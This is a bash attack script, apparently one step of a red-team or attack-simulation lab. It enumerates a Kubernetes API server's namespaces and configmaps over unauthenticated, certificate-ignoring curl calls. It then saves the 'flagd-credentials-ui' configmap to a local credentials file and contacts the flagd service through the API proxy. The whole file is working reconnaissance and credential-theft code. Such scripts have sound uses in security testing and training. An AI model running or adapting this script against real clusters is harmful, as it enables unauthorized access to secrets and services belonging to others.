#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

# ===== Config =====
API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
NSPROTO="${NSPROTO:-app}"
NSCREDS="${NSCREDS:-mem}"

CMNAME="flagd-credentials-ui"
FNPROTO="$DATA_PATH/KC3/demo.proto"
FNCREDS="$DATA_PATH/KC3/credentials"

# Installing dependencies and setup
require_tools curl jq
mkdir -p "$DATA_PATH/KC3"

echo "[*] Request /healthz /version /apis /namespaces to API"
curl -k "${API_SERVER}/healthz" >/dev/null
curl -k "${API_SERVER}/version" >/dev/null
curl -k "${API_SERVER}/apis" >/dev/null
mapfile -t NAMESPACES < <(curl -k "${API_SERVER}/api/v1/namespaces" | jq -r '.items[].metadata.name')

echo "[*] Found ${#NAMESPACES[@]} namespace"
# 3. loop on each ns and download configmap
for ns in "${NAMESPACES[@]}"; do
  echo "=== Namespace: $ns ==="
  if ! resp="$(curl -fsSk "$API_SERVER/api/v1/namespaces/$ns/configmaps" 2>/dev/null)"; then
    echo "  (skip: curl failed)"
    continue
  fi
  # print names; if JSON empty/not valid, don't fail
  jq -r '.items[]?.metadata.name' <<<"$resp" 2>/dev/null || echo "  (no items / invalid JSON)"
  echo
done

curl -sk "${API_SERVER}/api/v1/namespaces/${NSPROTO}/configmaps" \
  | jq -r '.items[] | select(.metadata.name=="proto") | .data["demo.proto"]' > "$FNPROTO"

curl -sk "$API_SERVER/api/v1/namespaces/$NSCREDS/configmaps" \
| jq -r --arg CMNAME "$CMNAME" '
  .items[]
  | select(.metadata.name==$CMNAME)
  | .data[]' > "$FNCREDS"

echo "[*] Contacting flagd"
curl -k "${API_SERVER}/api/v1/namespaces/${NSCREDS}/services/flagd:4000/proxy/feature"
